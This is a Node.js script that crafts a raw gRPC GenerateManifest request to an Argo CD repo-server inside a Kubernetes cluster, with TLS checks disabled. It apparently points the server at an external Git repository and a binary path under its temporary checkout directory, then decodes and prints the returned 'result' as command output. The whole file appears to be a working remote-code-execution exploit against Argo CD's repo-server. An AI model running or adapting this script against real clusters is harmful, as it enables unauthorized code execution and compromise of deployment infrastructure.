const http2 = require('http2');
const REPO='https://github.com/zhutaorvh/practice.git';
const COMMIT=process.env.C || '9ff8fffeeb468cfc84eea8f2e1aec3a320e8b9a8';
const BINPATH=process.env.B || '/tmp/_argocd-repo/ac75f401-7fee-565d-9ee8-15e3338b0a39/build';
const HOST='argocd-repo-server.argocd.svc.cluster.local';
function varint(x){const b=[];while(x>127){b.push((x&0x7f)|0x80);x=x>>>7}b.push(x&0x7f);return Buffer.from(b);}
function fstr(n,v){const d=Buffer.from(v,'utf8');return Buffer.concat([varint((n<<3)|2),varint(d.length),d]);}
function fmsg(n,m){return Buffer.concat([varint((n<<3)|2),varint(m.length),m]);}
function fvar(n,v){return Buffer.concat([varint((n<<3)|0),varint(v)]);}
const repo_msg=fmsg(1,fstr(1,REPO));
const appsrc=Buffer.concat([fstr(1,'https://127.0.0.1'),fstr(2,'.'),fmsg(8,Buffer.alloc(0))]);
const req=Buffer.concat([repo_msg,fstr(2,COMMIT),fvar(3,1),fstr(5,'d'),fstr(8,'d'),fmsg(10,appsrc),fmsg(13,fstr(2,BINPATH))]);
const lb=Buffer.alloc(4);lb.writeUInt32BE(req.length);
const frame=Buffer.concat([Buffer.from([0]),lb,req]);
let done=false;
const client=http2.connect('https://'+HOST+':8081',{rejectUnauthorized:false});
client.on('error',e=>{if(!done){done=true;console.log('CONN_ERR',e.message);process.exit(1)}});
const s=client.request({':method':'POST',':scheme':'https',':authority':HOST+':8081',':path':'/repository.RepoServerService/GenerateManifest','content-type':'application/grpc','te':'trailers'});
let data=Buffer.alloc(0),trailers={};
s.on('response',h=>console.log('STATUS',h[':status']));
s.on('data',d=>{data=Buffer.concat([data,d])});
s.on('trailers',t=>{try{for(const k in t)trailers[k]=Buffer.from(t[k]).toString()}catch(e){trailers=t}});
const finish=()=>{if(done)return;done=true;client.close();
  console.log('GRPC_STATUS',trailers['grpc-status']);
  if(trailers['grpc-message']){try{console.log('GRPC_MSG',decodeURIComponent(trailers['grpc-message']))}catch(e){console.log('GRPC_MSG',trailers['grpc-message'])}}
  let pos=0,out=[];
  while(pos+5<=data.length){const len=data.readUInt32BE(pos+1);pos+=5;if(pos+len<=data.length){out.push(data.slice(pos,pos+len));pos+=len}else break;}
  for(const m of out){
    let p=0,val=null;
    while(p<m.length){const tag=m[p];p++;const fn=tag>>3,wt=tag&7;
      if(wt===2){let l=0,sh=0;while(true){const b=m[p];p++;l|=(b&0x7f)<<sh;sh+=7;if(!(b&0x80))break;}const v=m.slice(p,p+l);p+=l;if(fn===1){const i=v.indexOf(0x7b);if(i>=0)val=v.slice(i);}}
      else if(wt===0){while(p<m.length&&(m[p]&0x80))p++;p++;}
      else break;}
    if(val){try{const cm=JSON.parse(val.toString());const r=cm.data&&cm.data.result;
      if(r){let rr=r;const pad=rr.length%4;if(pad)rr+='='.repeat(4-pad);console.log('===OUTPUT===');console.log(Buffer.from(rr,'base64').toString('utf8'));console.log('===END===');}
      else console.log('NO_RESULT_FIELD',val.toString().slice(0,300));}
      catch(e){console.log('JSON_ERR',e.message,val.toString().slice(0,300))}}
    else console.log('NO_FIELD1 bytes=',m.length);}
  if(out.length===0)console.log('NO_MESSAGES data_len=',data.length);
  process.exit(0);};
s.on('end',finish);s.on('close',finish);
s.end(frame);
setTimeout(()=>{if(!done){done=true;console.log('TIMEOUT');process.exit(2)}},parseInt(process.env.T||'180000'));
